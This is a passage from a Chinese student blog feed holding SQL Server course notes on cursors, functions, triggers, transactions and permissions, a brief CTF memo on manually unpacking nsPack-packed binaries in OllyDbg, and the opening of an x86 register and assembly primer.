class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select 姓名,课程名,成绩 &#x3D;<br>Case<br>when 成绩 &gt; 90 then &#39;A&#39;<br>when 成绩 &gt; 80 then &#39;B&#39;<br>when 成绩 &gt; 70 then &#39;C&#39;<br>when 成绩 &gt; 60 then &#39;D&#39;<br>else &#39;E&#39;<br>End<br>From sc<br>inner join studinfo on sc.学号 &#x3D; studinfo.学号<br>inner join course on sc.课程号 &#x3D; course.课程号<br><br>&#x2F;&#x2F;&#x2F;如果存在<br>If Exists(select * from studinfo)<br>select * from studinfo<br></code></pre></td></tr></table></figure><h2 id="声明游标，更新字段"><a href="#声明游标，更新字段" class="headerlink" title="声明游标，更新字段"></a>声明游标，更新字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare curor_mark Cursor<br>For select 成绩 from sc<br>For Update of 成绩<br>Go<br><br>&#x2F;&#x2F;&#x2F;删除游标<br>Deallocate curor_mark<br></code></pre></td></tr></table></figure><h2 id="游标定位操作"><a href="#游标定位操作" class="headerlink" title="游标定位操作"></a>游标定位操作</h2><p>定义基于sc的游标，分别将第三条记录，从当前记录开始向前第二条记录和最后一条记录显示在屏幕上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare cursor_mark Cursor Scroll<br>For<br>Select * from sc<br>inner join studinfo on sc.学号 &#x3D; Studinfo.学号<br>inner join course on course.课程号 &#x3D; sc.课程号<br>Open course_mark<br>fetch absolute 3 from cursor_mark<br>fetch relative -2 from cursor_mark<br>fetch last from cursor_mark<br>Close cursor_mark<br>Deallocate cursor_mark<br></code></pre></td></tr></table></figure><h2 id="游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分"><a href="#游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分" class="headerlink" title="游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分"></a>游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare @name char(20), @num int<br>Declare cursor_mark Cursor Scroll<br>For<br>Select 姓名,sc.学号 from sc<br>inner join studinfo on sc.学号 &#x3D; studinfo.学号<br>inner join course on course.课程号 &#x3D; sc.课程号<br>For Update of 成绩<br>Open cursor_mark<br>Fetch Next from cursor_mark Into @name , @num<br>while @@fetch_status &#x3D; 0<br>Begin<br>if @name &#x3D; &#39;女朋友&#39;<br>Update sc<br>set 成绩 &#x3D; 成绩 + 5<br>where current of cursor_mark<br>Fetch Next from cursor_mark Into @name , @num<br>End<br>Close cursor_mark<br>Deallocate cursor_mark<br></code></pre></td></tr></table></figure><h2 id="给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score-gt-60则为“P”，否则为“F”"><a href="#给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score-gt-60则为“P”，否则为“F”" class="headerlink" title="给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score&gt;60则为“P”，否则为“F”"></a>给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score&gt;60则为“P”，否则为“F”</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter Table sc<br>Add 等级 char(2) null<br>Go<br>Begin<br>Update sc<br>set 等级 &#x3D; <br>Case<br>when 成绩 &gt;&#x3D; 60 then &#39;P&#39;<br>when 成绩 &lt; 60 then &#39;F&#39;<br>End<br>End<br></code></pre></td></tr></table></figure><p>==dateadd(year,1,出生日期) 出生日期的year + 1==</p><p>==month(出生日期) 取出生日期的month出来==</p><h2 id="定义标量函数f-stud1-统计某学院的学生人数"><a href="#定义标量函数f-stud1-统计某学院的学生人数" class="headerlink" title="==定义标量函数f_stud1,统计某学院的学生人数=="></a>==定义标量函数f_stud1,统计某学院的学生人数==</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mssql">If Exists(select * from sysobjects where name &#x3D; &#39;f_stud1&#39;)<br>drop function f_stud1<br>Go<br>Create Function f_stud1(@nam char(10))<br>return int<br>AS<br>Begin<br>Declare @n int<br>set @n &#x3D; (select count(*) from studinfo<br>                 where 系部名称 &#x3D; @nam)<br>        return (@n)<br>    End<br>Go<br><br>Select dbo.f_stud1(&#39;媒体工程&#39;) as 人数<br></code></pre></td></tr></table></figure><h2 id="定义一-内嵌表值函数-f-stud3，返回某学生选修课情况，包含姓名、课程名，分数等"><a href="#定义一-内嵌表值函数-f-stud3，返回某学生选修课情况，包含姓名、课程名，分数等" class="headerlink" title="定义一==内嵌表值函数==f_stud3，返回某学生选修课情况，包含姓名、课程名，分数等"></a>定义一==内嵌表值函数==f_stud3，返回某学生选修课情况，包含姓名、课程名，分数等</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Function f_stud3(@name nchar(10))<br>return Table<br>As<br>return (select 姓名 ,课程名,成绩 from sc s<br>           inner join studinfo on s.学号 &#x3D; studinfo.学号<br>           inner join course on s.学号 &#x3D; course.学号<br>           where 姓名 &#x3D; @nam)<br>Go<br><br>selet * from dbo.f_stud3(&#39;Mie&#39;)<br></code></pre></td></tr></table></figure><h2 id="创建一个-带输入的存储过程-，通过调用上例的f-stud3，查询某学生的选修课程情况"><a href="#创建一个-带输入的存储过程-，通过调用上例的f-stud3，查询某学生的选修课程情况" class="headerlink" title="创建一个==带输入的存储过程==，通过调用上例的f_stud3，查询某学生的选修课程情况"></a>创建一个==带输入的存储过程==，通过调用上例的f_stud3，查询某学生的选修课程情况</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Procedure use_f_stud3(@nam nchar(10))<br>AS<br>select * from dbo.f_stud3(@nam)<br>Go<br><br>Exec use_f_stud3(&#39;Mie&#39;)<br></code></pre></td></tr></table></figure><p>==datediff(year,出生日期,getdate()) 获取年龄==</p><h2 id="定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空"><a href="#定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空" class="headerlink" title="==定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空=="></a>==定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空==</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mssql">create function f_tableinfo<br>(@tableName nvarchar(200))<br>returns @result table (ColName nvarchar(200),ColType nvarchar(200),ColLength int,ColIsNull bit)<br>as<br>begin<br>insert into @result(ColName,ColType,ColLength,ColIsNull)<br>select<br>c.[name] as ColumnName,<br>t.[name] as ColumnType,<br>c.max_length as MaxLength,<br>c.is_nullable as [IsNull]<br>from sys.columns c<br>inner join sys.types t on c.system_type_id&#x3D;t.system_type_id<br>Where c.[object_id]&#x3D;object_id(@tableName) and t.[name]&lt;&gt;&#39;sysname&#39;<br>Order by c.column_id<br>Return<br>End<br>Go<br>select * from f_tableinfo(&#39;Studinfo&#39;)<br></code></pre></td></tr></table></figure><h2 id="使用存储过程新建department-系部人数，总人数，男生人数，女生人数-，用SQL语句从学生表中采集相应信息添加到系部表中。"><a href="#使用存储过程新建department-系部人数，总人数，男生人数，女生人数-，用SQL语句从学生表中采集相应信息添加到系部表中。" class="headerlink" title="使用存储过程新建department(系部人数，总人数，男生人数，女生人数)，用SQL语句从学生表中采集相应信息添加到系部表中。"></a>使用存储过程新建department(系部人数，总人数，男生人数，女生人数)，用SQL语句从学生表中采集相应信息添加到系部表中。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Procedure p_stuXibu<br>As<br>select 系部名称 as 系部名称,count(*) as 总人数,<br>sum(case 姓名 when &#39;女&#39; then 1 else 0 End) as 女生人数<br>sum(case 姓名 when &#39;男&#39; then 1 else 0 End) as 男生人数<br>into 系部表 From studinfo<br>Group by 系部名称<br>Go<br>p_stuXiBu<br></code></pre></td></tr></table></figure><h2 id="创建触发器tr-stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果"><a href="#创建触发器tr-stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果" class="headerlink" title="创建触发器tr_stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果"></a>创建触发器tr_stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create trigger tr_stud1 on course<br>For Insert<br>As<br>select * from inserted<br></code></pre></td></tr></table></figure><h2 id="建立一个命名事务trans-credit，当学号为-sid的学生所选的课程（课程编号为-cid）的总学分没有超过10时，将学号和课程编号值（-sid-cid）添加到grade表中，同时修改stu-credit表中的总学分，使总学分为当前总学分-所选课程的学分值（-cre），否则，取消该事务，实现回滚。"><a href="#建立一个命名事务trans-credit，当学号为-sid的学生所选的课程（课程编号为-cid）的总学分没有超过10时，将学号和课程编号值（-sid-cid）添加到grade表中，同时修改stu-credit表中的总学分，使总学分为当前总学分-所选课程的学分值（-cre），否则，取消该事务，实现回滚。" class="headerlink" title="建立一个命名事务trans_credit，当学号为@sid的学生所选的课程（课程编号为@cid）的总学分没有超过10时，将学号和课程编号值（@sid,@cid）添加到grade表中，同时修改stu_credit表中的总学分，使总学分为当前总学分+所选课程的学分值（@cre），否则，取消该事务，实现回滚。"></a>建立一个命名事务trans_credit，当学号为@sid的学生所选的课程（课程编号为@cid）的总学分没有超过10时，将学号和课程编号值（@sid,@cid）添加到grade表中，同时修改stu_credit表中的总学分，使总学分为当前总学分+所选课程的学分值（@cre），否则，取消该事务，实现回滚。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs mssql">use Stuhyy<br>go<br><br>if exists(select * from sys.all_objects where name &#x3D; &#39;trans_credit&#39;)<br>drop trigger trans_credit<br>go<br><br>create trigger trans_credit on stu_credit<br>for insert<br>as<br>BEGIN TRAN 选课<br>--save tran 选课<br>declare @sid char(10),@cid char(10),@mark int,@totalmark int<br>set @sid &#x3D; (select 学号 from inserted)<br>set @cid &#x3D; (select 课程号 from inserted)<br>set @mark &#x3D; (select 学分 from inserted)<br>set @totalmark &#x3D; (select 总学分 from stu_credit where 学号 &#x3D; @sid) + @mark<br>if @totalmark &gt;10<br>BEGIN<br>print &#39;超出总学分!选课失败！&#39;<br>rollback tran 选课<br>END<br>else<br>BEGIN<br>update stu_credit set 总学分 &#x3D; @totalmark where 学号 &#x3D; @sid<br>if OBJECT_ID(N&#39;grade&#39;,N&#39;U&#39;) is not null<br>insert into grade <br>Values(@sid,@cid)<br>else <br>create table student  --创建表student<br>(学号 char(10) ,<br>课程号 char(10),<br>)<br>insert into grade <br>Values(@sid,@cid)<br>END<br>commit TRAN 选课<br>GO<br>GO<br><br></code></pre></td></tr></table></figure><h2 id="用T-Sql语句创建sql-server-登录1-test-w1-登录密码为12345-默认访问pubs"><a href="#用T-Sql语句创建sql-server-登录1-test-w1-登录密码为12345-默认访问pubs" class="headerlink" title="用T-Sql语句创建sql server 登录1_test_w1,登录密码为12345,默认访问pubs"></a>用T-Sql语句创建sql server 登录1_test_w1,登录密码为12345,默认访问pubs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">sp_addlogin<br>@loginame &#x3D; &#39;Mie&#39;<br>@passwd &#x3D; &#39;12345&#39;<br>@dfdb &#x3D; &#39;pubs&#39;<br></code></pre></td></tr></table></figure><h2 id="授予Windows用户连接到sql-server的权利"><a href="#授予Windows用户连接到sql-server的权利" class="headerlink" title="授予Windows用户连接到sql server的权利"></a>授予Windows用户连接到sql server的权利</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_grantloging ‘CSUSQL\1_test_w2’<br>Sp_addlogin<br>@loginame &#x3D; &#39;1_test_s2&#39;<br>@defdb &#x3D; &#39;Stuhyy&#39;<br></code></pre></td></tr></table></figure><h2 id="添加数据库用户"><a href="#添加数据库用户" class="headerlink" title="添加数据库用户"></a>添加数据库用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_grantdbaccess &#39;u_test_w1&#39;<br></code></pre></td></tr></table></figure><h2 id="禁止用户u-test-s1-对course表的插入和删除权限，撤销对studinfo的更新权限"><a href="#禁止用户u-test-s1-对course表的插入和删除权限，撤销对studinfo的更新权限" class="headerlink" title="禁止用户u_test_s1 对course表的插入和删除权限，撤销对studinfo的更新权限"></a>禁止用户u_test_s1 对course表的插入和删除权限，撤销对studinfo的更新权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">GRANT<br>DENY Insert,Delete On course<br>Revoke Update on Studinfo<br></code></pre></td></tr></table></figure><h2 id="对用户u-test-s1添加成员r-test-s1"><a href="#对用户u-test-s1添加成员r-test-s1" class="headerlink" title="对用户u_test_s1添加成员r_test_s1"></a>对用户u_test_s1添加成员r_test_s1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC Sp_addrolemember &#39;u_test_s1&#39; , &#39;r_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="删除账户"><a href="#删除账户" class="headerlink" title="删除账户"></a>删除账户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Sp_revokelogin &#39;u_test_w1&#39;<br>Sp_revokelogin &#39;u_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="删除数据库中用户"><a href="#删除数据库中用户" class="headerlink" title="删除数据库中用户"></a>删除数据库中用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Sp_revokedbaccess &#39;r_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="删除数据库角色r-test-s1"><a href="#删除数据库角色r-test-s1" class="headerlink" title="删除数据库角色r_test_s1"></a>删除数据库角色r_test_s1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_droprolemember &#39;u_test_w1&#39;,&#39;r_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="2019-12-4上课笔记"><a href="#2019-12-4上课笔记" class="headerlink" title="2019/12/4上课笔记"></a>2019/12/4上课笔记</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">use employee<br>Go <br>if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sys.all_objects <span class="hljs-keyword">where</span><br>name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;trigger_welcome&#x27;</span> <span class="hljs-keyword">and</span> type <span class="hljs-operator">=</span> &quot;TR&quot;)<br><span class="hljs-keyword">Drop</span> <span class="hljs-keyword">trigger</span> trigger_welcome<br>go<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Create</span> <span class="hljs-keyword">trigger</span> tr_employye <span class="hljs-keyword">on</span> employee<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">delete</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@msg</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@msg</span> <span class="hljs-operator">=</span> str(@<span class="hljs-variable">@rowcount</span>)<span class="hljs-operator">+</span>&quot;个员工被删除&quot;<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@msg</span><br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Create</span> <span class="hljs-keyword">Trigger</span> test_tr<br><span class="hljs-keyword">on</span> employee <span class="hljs-keyword">from</span> <span class="hljs-keyword">insert</span>,update,<span class="hljs-keyword">delete</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> inserted<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> deleted<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> tri_del_sales2<br><span class="hljs-keyword">on</span> sotrebak<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">as</span><br><span class="hljs-keyword">delete</span> sales_bak <span class="hljs-keyword">from</span> deleted<br><span class="hljs-keyword">where</span> deleted.sotr_id <span class="hljs-operator">=</span> sales_bak.stor_id<br></code></pre></td></tr></table></figure><h2 id="2019-12-11-上课笔记"><a href="#2019-12-11-上课笔记" class="headerlink" title="2019/12/11 上课笔记"></a>2019/12/11 上课笔记</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">BEGIN</span> TRAN[SACTION]<br><br><span class="hljs-keyword">COMMIT</span> TRAN[SACTION]<br><br><span class="hljs-keyword">ROLLBACK</span> TRAN[SACTION]<br></code></pre></td></tr></table></figure><h2 id="2019-12-25复习"><a href="#2019-12-25复习" class="headerlink" title="2019/12/25复习"></a>2019/12/25复习</h2><p>判断5分，单选20分，填空20分，简答题10分，综合设计45分</p><p>E-R图什么标志表示实体，属性，关系？     P9</p><p>数据库三级模式体系结构，有利于==数据独立性==</p><blockquote><p>三级模式结构又是什么，为什么可以有利   P6</p><p>模式，内模式，外模式</p><p>模式:对数据库全部数据的数据模式和特征的总体描述</p><p>内模式：存储模式，数据库最低一级逻辑描述</p><p>外模式:用户视图（来源一个或多个表组成的查询表</p></blockquote><p>数据库系统中，用户使用的数据视图用==外模式==描述，该模式是用户与数据库系统之间的接口</p><p>一对一，一对多，多对多举例</p><p>数据库特点：数据共享，数据完整性和数据独立性</p><p>范式分解:减少冗余    范式P27</p><blockquote><p>是什么范式，判断不符合更高范式即可</p><p>1NF：所有属性都不能分解为更基本的数据元素</p><p>2NF：不存在部分函数依赖（某列也能函数决定另一列属性）</p><p>3NF：非传递函数依赖</p></blockquote><p>数据模型三要素：数据结构（二维表），关系操作（选择投影链接），完整性约束</p><p>DBMS、DB、DBS（system，包含人）、DBA</p><table><thead><tr><th>Create</th><th>Insert</th></tr></thead><tbody><tr><td>Alter</td><td>update</td></tr><tr><td>Drop</td><td>Delete</td></tr></tbody></table><p>自然连接：消除重复列</p><p>sql server数据库文件后置：.mdf .ldf .ndf</p><p>windows身份验证，混合身份验证</p><p>存储过程：主动调用</p><p>触发器：根据条件触发</p><p>综合设计：E-R图转换，35分写代码（查询，存储过程，事务，每题6-8分）</p><p>以633开头的7位电话怎么写</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手动脱壳</title>
    <link href="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h2><p>可分为压缩壳（常见的有UPX、北斗、ASDPack、Npack、PECompact等）和保护壳（如强壳Safengine、VMprotect、winlicense、Themida等），压缩壳作用是把程序进行体积缩小化处理，保护壳主要作用是混淆或加密代码防止他人进行逆向程序、破解程序。</p><p>注意右面寄存器FPU的显示，当有且只有ESP和EIP为红色时，我们可以用ESP定律了</p><p><a href="https://baike.baidu.com/item/esp%E5%AE%9A%E5%BE%8B/840881?fr=aladdin#1">ESP定律</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/6213852.html">参考</a></p><h3 id="nsPack"><a href="#nsPack" class="headerlink" title="nsPack"></a>nsPack</h3><p>还要找到OEP，所谓的OEP，意即程序的入口点，可以用OD载入，不分析代码。</p><p>首先已知是nSPack壳，直接用OD打开，发现pushfd和pushad两句关键句：==win下的吾爱破解版od可==<img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143025540.png" class="" title="image-20190820143025540"></p><p>ESP定律的落脚点，可以看到落脚点下面一行就是一个大跳转，继续F8</p><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143113466.png" class="" title="image-20190820143113466"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143126509.png" class="" title="image-20190820143126509"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143150130.png" class="" title="image-20190820143150130"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143211831.png" class="" title="image-20190820143211831">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编、逆向工程基础</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/qq_21508727/article/details/80559270">https://blog.csdn.net/qq_21508727/article/details/80559270</a></p><h2 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h2><blockquote><ol><li>·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。</li><li>·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。</li></ol><blockquote><p>一个16进制占4bit</p></blockquote></blockquote><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：</p><blockquote><ol><li>EAX： 累加器</li><li>EBX： 基址寄存器</li><li>ECX： 计数器</li><li>EDX： 数据寄存器</li><li>ESI： 源变址寄存器</li><li>EDI： 目的变址寄存器</li><li>EBP： 扩展基址指针寄存器</li><li>ESP： 栈指针寄存器</li><li>EIP： 指令指针寄存器</li></ol><blockquote><p>==大小都是4个字节==</p><blockquote><ol><li><p>EBP： EBP在栈中运用最广，刚开始没有什么需要特别注意的 ;) </p></li><li><p>ESP： ESP指向栈区域的栈顶位置。栈是一个存放即将会被用到的数据的地方，你可以去搜索一下push/pop 指令了解更多栈知识。 </p></li><li><p>EIP： EIP指向下一个将会被执行的指令。</p></li></ol><hr><p><strong>栈（stack）：后进先出的数据结构</strong>     </p><p><strong>堆（heap）：经过排列的树形数据结构，通常指二叉堆，存取是随意的</strong></p></blockquote></blockquote></blockquote><p>有一些寄存器是16位甚至8位的，是不能直接寻址的。</p><blockquote><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342053303.png" class="" width="1565342053303"></blockquote><p>一个寄存器可以这样看：</p><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342088084.png" class="" width="1565342088084"><p>EAX是名字，AX是低16位部分，又分为低8位AL，高8位AH</p><p><strong>了解：</strong></p><p>i.单字节（8位）寄存器：</p><blockquote><ol><li>AL and AH</li><li>BL and BH</li><li>CL and CH</li><li>DL and DH</li></ol></blockquote><p>ii.单字（16位）寄存器：这些寄存器大小为一个字（=2字节=16位）。一个单字寄存器包含两个单字节寄存器。通常根据功能区分</p><p>1.通用寄存器:</p><blockquote><ol><li>AX (单字=16位) = AH + AL -&gt; 其中‘+’号并不代表把它们代数相加。AH和AL寄存器是相互独立的，只不过都是AX寄存器的一部分，所以你改变AH或AL (或者都改变) ，AX寄存器也会被改变。 </li><li>-&gt; ‘accumulator’(累加器)：用于进行数学运算</li><li>BX -&gt; ‘base’(基址寄存器)：用来连接栈(之后会说明)</li><li>CX 